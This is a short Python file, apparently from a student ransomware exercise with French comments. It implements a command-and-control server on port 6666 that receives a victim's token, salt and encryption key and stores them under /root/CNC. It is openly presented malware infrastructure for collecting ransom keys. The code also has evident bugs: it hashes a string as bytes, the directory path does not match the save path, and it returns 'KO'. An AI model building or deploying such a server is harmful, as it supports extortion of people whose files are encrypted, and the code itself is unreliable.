import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        
        # récupère les 3 données
        token = body.get('token')
        salt = body.get('salt')
        key = body.get('key')

        #on créer le repertoire dans le cnc
        nom_dir= sha256(token).hexdigest()#nom du fichier en hachant le token en sha256
        dir_path= os.path.join(self.ROOT_PATH, nom_dir)#on se place au /root/CNC
        os.makedirs(dir_path, exist_ok=True)

        self.save_b64(token,salt,'salt.bin')#stockage du salt
        self.save_b64(token,key,'key.bin')#stockage de la key

        return {"status":"KO"}

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()